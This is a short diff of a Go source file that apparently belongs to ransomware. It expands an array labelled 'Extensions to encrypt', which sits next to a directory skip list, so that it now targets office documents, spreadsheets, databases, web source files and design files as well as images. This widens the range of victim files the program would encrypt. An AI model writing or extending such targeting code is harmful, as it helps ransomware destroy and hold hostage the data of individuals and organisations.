@@ -2,10 +2,26 @@ package main
 
 // Extensions to encrypt
 var Extensions = [...]string{
-	"png",
+	"txt",
+	"doc",
+	"docx",
+	"xls",
+	"xlsx",
+	"ppt",
+	"pptx",
+	"odt",
 	"jpg",
-	"jpeg",
-	"tif",
+	"png",
+	"csv",
+	"sql",
+	"mdb",
+	"sln",
+	"php",
+	"asp",
+	"aspx",
+	"html",
+	"xml",
+	"psd",
 }
 
 // IgnoreDirs will skip directories that contains the string
